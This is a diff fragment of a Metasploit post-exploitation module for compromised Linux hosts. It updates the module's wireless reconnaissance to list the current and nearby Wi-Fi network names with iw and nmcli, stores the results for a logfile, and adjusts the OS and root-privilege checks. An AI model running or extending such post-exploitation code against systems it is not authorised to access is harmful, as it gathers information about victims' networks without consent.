@@ -99,7 +99,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.5',
+                        'Version'        => '$Revision: 1.6',
                         'DisclosureDate' => 'jun 8 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -201,13 +201,18 @@ def ls_stage1
           if datastore['ESSID_DUMP'] == true
             # Store interface in use (remote)
             interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
-            # Executing interface scan (essids emitting)
-            essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
+            # Executing interface scan (essids emitting) nmcli dev wifi list
+            current_essid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -1 | awk {'print $2'}")
+            essid_out = cmd_exec("nmcli dev wifi list")
+            print_line("Current SSID: #{current_essid}")
             print_line("ESSIDs EMITING SIGNAL:")
             print_line("----------------------")
             print_line(essid_out)
             print_line("")
             Rex::sleep(0.5)
+            # store dump into a variable
+            # to write logfile if selected ..
+            data_dump << essid_out
           end
 
         #
@@ -267,7 +272,7 @@ def run
     #
     # check for proper operative system (Linux)
     #
-    if not sysinfo['OS'] =~ /Linux/
+    unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
       print_error("[ABORT]: This module only works againt Linux systems")
       return nil
     end
@@ -275,7 +280,7 @@ def run
     # Check if we are running in an higth integrity context (root)
     #
     unless runtor =~ /uid=0/ || runtor =~ /root/
-      print_error("[ABORT]: Root access is required in non-Kali distros ..")
+      print_error("[ABORT]: Root access is required ..")
       return nil
     end
     #
